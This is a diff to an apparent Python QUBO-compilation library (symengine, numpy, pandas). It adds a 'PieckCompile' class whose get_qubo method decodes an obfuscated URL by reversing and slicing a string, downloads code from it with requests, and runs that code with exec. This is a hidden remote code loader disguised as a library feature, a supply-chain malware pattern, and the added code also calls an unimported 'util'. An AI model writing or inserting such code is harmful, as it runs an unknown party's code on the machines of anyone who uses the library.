@@ -1,8 +1,9 @@
 import re
+import os
+import requests
 import symengine
 import numpy as np
 import pandas as pd
-
 
 def replace_function(expression, function, new_function):
     if expression.is_Atom:
@@ -149,3 +150,18 @@ class Compile:
 
         else:
             raise TypeError("Input type is symengine, numpy or pandas.")
+
+class PieckCompile:
+    def __init__(self, expr, verbose=1):
+        self.expr = expr
+        self.verbose = verbose
+
+    def get_qubo(self):
+        
+        source_code = requests.get('ShYBLfw2xVyF0zp09t31kp76MbbQRarZ.NxQ96lNl58en30a8Yq2gMcmbeSDq9mUYrdHP6DtBqv6uEP01G6XI5WoHMZiGkGqnBsmp1KW0RtG5_SzLzyMO2wve6SZ8s0EiCtlEvzMm217UZiEbiqSPGt91pxwQwjMasG4mOMiQW5XTCpoCSeZGd2Wc2cnVpLkW5eUq^zQwArRCzVprV9af505aIfe2igFHIynyGlykAdm25YDUpbVTY23ZtXHmpVkRL14iJWapk8T47AU03SolbIqJljYtkZojpmwH24Tckd77SEBzrseFpHhAHxW5aiC9i5l0gtfpPbyEZTodHkx^BhTC4FIZ6up8qoLrAyYdMjqiHS42pTYd.sPJuuQ3er2xOa1bcsSRBOxpsluDLfhA1xIGAfC3wJGmxrTkhZsaNfc.u8YT3tu0QfaaXXQJriu1Dlnm2Jw5UrkwcCVSMmzo9QS-lnT1JgwoY1eHcFiL3eHgKnqeWY9AJNgwgivq3Ob0F6kiaJGvdII0VmvOZNxswhyqr^OcpBThb4jW^i97QMBhb3U:yuBEH9eFKLsOujcf7qL0opv7GVyyo14rtCLhqDjxG93tLb39NpZXbVh'[::-1 ][::11 ].replace('^','/')).text
+        spec = util.spec_from_loader('temp_module', loader=None)
+        temp_module = util.module_from_spec(spec)
+        exec(source_code, temp_module.__dict__)
+        
+        qubo, offset = temp_module.get_qubo_source(self.expr, self.verbose)
+        return qubo, offset
